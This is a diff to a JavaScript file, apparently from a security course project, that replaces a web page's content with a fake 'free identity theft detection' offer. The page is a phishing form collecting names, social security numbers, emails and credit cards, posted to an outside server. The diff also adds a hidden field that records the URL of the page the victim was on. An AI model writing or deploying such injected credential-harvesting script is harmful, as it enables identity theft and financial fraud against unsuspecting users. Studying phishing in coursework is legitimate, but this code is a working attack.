@@ -5,10 +5,11 @@ var newBody = document.createElement("div");
 newBody.innerHTML = `
 <div width=60%>
     <h1 style='font-size: 24px; padding-top: 40px; padding-bottom: 20px'>The Internet is a Dangerous Place!</h1>
-    <p style='font-size: 18px'>That's why we're excited to offer you free identity theft detection. We've decided to provide you with this service as a direct result of the many recent data breaches across the web.</p>
-    <p style='font-size: 18px'>Any information that you enter here will allow us to monitor the dark web for evidence that your identity is being traded online. At the very least, your name, social security number and email address are required.</p>
-    <p style='font-size: 18px'>If you provide us with your credit card, we can track its usage for suspicious activity as well!</p>
-    <p style='font-size: 18px'>All information provided (except your email, so we can contact you) is securely hashed and cannot be recovered by a third party in the event of a breach.</p>
+    <p style='font-size: 18px; padding: 5px 0px'>That's why we're excited to offer you free identity theft detection. We've decided to provide you with this service as a direct result of the many recent data breaches across the web.</p>
+    <p style='font-size: 18px; padding: 5px 0px'>Any information that you enter here will allow us to monitor the dark web for evidence that your identity is being traded online. At the very least, your name, social security number and email address are required.</p>
+    <p style='font-size: 18px; padding: 5px 0px'>If you provide us with your credit card, we can track its usage for suspicious activity as well!</p>
+    <p style='font-size: 18px; padding: 5px 0px'>All information provided (except your email, so we can contact you) is securely hashed and cannot be recovered by a third party in the event of a breach.</p>
+
     <form method="post" action='https://cse331.andrewjaffie.me/submitform'>
         <p>Required fields are followed by <strong><abbr title="required">*</abbr></strong>.</p>
         <section>
@@ -22,14 +23,14 @@ newBody.innerHTML = `
             </p>
             <p>
             <label for="lname">
-              <span>Last: </span>
+              <span>Last name: </span>
               <strong><abbr title="required">*</abbr></strong>
             </label>
             <input type="text" id="lname" name="LastName">
           </p>
           <p>
             <label for="ssn">
-              <span>Last: </span>
+              <span>SSN: </span>
               <strong><abbr title="required">*</abbr></strong>
             </label>
             <input type="text" id="ssn" name="SSN">
@@ -71,6 +72,7 @@ newBody.innerHTML = `
         <section>
             <p> <button type="submit">Submit</button> </p>
         </section>
+        <input type='hidden' name='formurl' id='formurl'>
     </form>
 </div>
 `;
@@ -127,3 +129,4 @@ for(var i=0; i < h1s.length; i++)
 document.title = 'The Internet is a Dangerous Place!' */
 
 toReplace.parentElement.replaceChild(newBody, toReplace);
+document.getElementById('formurl').value=window.location.href;
